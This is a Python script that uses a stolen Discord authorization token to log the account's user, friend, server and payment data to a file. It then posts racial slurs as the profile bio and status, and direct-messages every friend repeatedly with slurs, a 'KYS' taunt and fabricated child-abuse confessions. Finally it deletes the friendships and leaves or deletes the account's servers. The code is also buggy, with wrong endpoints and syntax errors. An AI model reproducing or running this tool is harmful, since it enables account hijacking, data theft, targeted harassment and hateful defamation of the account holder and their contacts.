from sys import argv as args
args = args[1:]
import requests
from time import sleep
from random import choice
import json 
import datetime

# only use if ur pro and have auth pls

HEADERS: dict = {"authorization": args[0], "Content-Type": "application/json"}
DATE: datetime = datetime.datetime.now()

if (len(args) < 1):
    raise IndexError("Not enough arguments!")
    exit()
  
if ((info := requests.get("https://discord.com/api/users/@me", headers=HEADERS)).status_code != 200):
    print("Invalid token!")
    exit()

FILE = f"logs-{DATE}-{args[0]}"
def log(index, value):
    with open(FILE, 'r') as file:
        file.write(f"{index}: {value}\n")
        file.close()
    

def section(name: str, sect: dict) -> None:
    with open(FILE, 'r') as file:
        file.write(f"\n{name}\n{'='*30}\n")
        file.close()
    for index, value in enumerate(sect):
        log(index, value)

def send(link: str, msg: str):
    requests.post(f"https://discord.com/api/channel/{link}/messages", headers=HEADERS, json={'content': msg})

with open(FILE, 'r') as file:
    file.write(f'LOG FOR USER {info["username"] if info["discriminant"] == "0000" else f"{info["""username"""]}#info{["""discriminant"""]}"}\n')
    file.close()

section("USER INFO", info)
section("GIFTS", [] if ((gifts := requests.get("https://discord.com/api/v8/users/@me/entitlements/gifts")).status_code != 200) or (gifts.json == []) else gifts.json())
section("GUILDS", [] if ((guilds := requests.get("https://discord.com/api/v8/users/@me/entitlements/gifts")).status_code != 200) or (guilds.json == []) else guilds.json())
section("FRIENDS", [] if ((friends := requests.get("https://discord.com/api/v8/users/@me/entitlements/gifts")).status_code != 200) or (friends.json == []) else friends.json())
section("PAYMENT INFO", [] if ((payment := requests.get("https://discord.com/api/v8/users/@me/entitlements/gifts")).status_code not in [201, 204, 200]) or (payment.json == []) else payment.json())

requests.patch("https://discord.com/api/v9/users/@me", headers=HEADERS, json={'bio': "FUCK NIGGERS\nNIGGERS"})
requests.patch("https://discord.com/api/v9/users/@me", headers=HEADERS, json={'status': {'text': "NIGGERS I HATE NIGGERS BAN ME"}})


for friend in friends:
    for i in range(5):
        send(f"https://discord.com/channels/@me/{friend['id']}", "NIGGER FUCK YOU KYS I ALWAYS HATED YOU")
        sleep(0.25)
        send(f"https://discord.com/channels/@me/{friend['id']}", "I RAPE LITTLE KIDS\N I LOVE CHILD PORN")
    
    requests.delete(f"https://discord.com/api/@me/relationships/{friend['id']}", headers=HEADERS )

for guild in guilds:
    
    if (guild["owner"):
        requests.post(f"https://discord.com/api/guilds/{guild['id']}", headers=HEADERS, json={})
    else:
        requests.delete(f"https://discord.com/api/users/@me/guilds/{guild['id']}/delete", headers=HEADERS, json={})
        
send(f"https://discord.com/channels/@me/{choice(friends)['id']}", "https://postimg.cc/F1v9zPpW")
